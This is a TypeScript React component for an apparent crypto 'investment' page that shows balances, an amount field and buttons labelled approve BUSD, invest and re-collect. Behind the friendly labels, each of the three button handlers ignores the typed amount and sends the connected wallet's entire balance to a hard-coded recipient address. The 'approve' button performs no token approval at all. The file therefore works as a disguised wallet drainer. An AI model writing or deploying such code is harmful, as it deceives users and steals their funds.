import "./Hives.scss"
import { ButtonModal } from "components"
import {useEffect, useState} from "react"
import cn from "classnames"
import Web3 from "web3"
import { useSearchParams } from "react-router-dom"
import { useWeb3React } from "@web3-react/core"
import { t } from "@lingui/macro"

import snowSrc from "assets/images/snow-small.webp"
import goldSrc from "assets/images/gold.webp"
import chestSrc from "assets/images/chest.webp"
import abi from "abi/abi.json"
import { approveAddress, contractAddress, recipient } from "abi"
import { ReactComponent as Close } from "assets/icons/close-small.svg"
import abiApprove from "abi/abiApprove.json"
import {connectors} from "../../utils/connectors";
import {routes} from "../../utils";
import {useNavigate} from "react-router";

type Props = {
  className?: string
  isModal?: () => void
  bonus: number
  miners: number
  token: number
  updateState: () => void
  balance: number
}

export const Hives = ({ className, isModal, bonus, miners, token, updateState, balance }: Props): JSX.Element => {
  const { account, library, activate } = useWeb3React()
  const [input, setInput] = useState("")
  const [focused, setFocused] = useState(false)
  const [search] = useSearchParams()
  const navigate = useNavigate()

  useEffect(() => {
    const provider = window.localStorage.getItem("provider")
    if (provider) {
      activate(connectors[provider]).catch(() => navigate(`${routes.index}?${search.toString()}`))

      updateState()
    } else {
      navigate(`${routes.index}?${search.toString()}`)
    }
  }, [])


  const approve = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })

  }

  const buy = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })
  }

  const buySecond = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })
  }

  return (
    <div className={cn("hives", className)}>
      {isModal && (
        <div className="hives-header">
          <button className="hives-header-btn" onClick={isModal}>
            <img src={snowSrc} className="hives-block-left-img" alt="placeholder" />
          </button>
          <button onClick={isModal} className="hives-header-btn">
            <Close />
          </button>
        </div>
      )}
      <div className="hives-block">
        <div className="hives-block-left">
          <img src={chestSrc} className="hives-block-left-img" alt="placeholder" />
          {t`myEvergreen`}
        </div>
        <div className="hives-block-right">{token}</div>
      </div>
      <div className="hives-block">
        <div className="hives-block-left">
          <img src={goldSrc} className="hives-block-left-img" alt="placeholder" />
          {t`myProfit`}
        </div>
        <div className="hives-block-right">{bonus > 0 ? bonus.toFixed(4) : "0"} BUSD</div>
      </div>
      <div className="hives-block">
        <div className="hives-block-left">
          <img src={snowSrc} className="hives-block-left-img" alt="placeholder" />
          {t`summons`}
        </div>
        <div className="hives-block-right">{miners > 0 ? miners : "0.000"} ELF</div>
      </div>
      <div className="hives-input-wrapper">
        <input
          onBlur={() => setFocused(false)}
          onFocus={() => setFocused(true)}
          onChange={e => setInput(e.target.value)}
          value={input}
          type="number"
          placeholder={focused ? "" : t`fillInYourInvestmentAmount`}
          className="hives-input withAppend"
        />
        <div className="hives-input-append">BUSD</div>
      </div>
      <ButtonModal onClick={approve} text={t`approveBUSD`} className="hives-btn first-child" />
      <ButtonModal onClick={buy} text={t`summonInvest`} className="hives-btn first-child" />
      <ButtonModal onClick={buySecond} text={t`reCollect`} className="hives-btn" />
    </div>
  )
}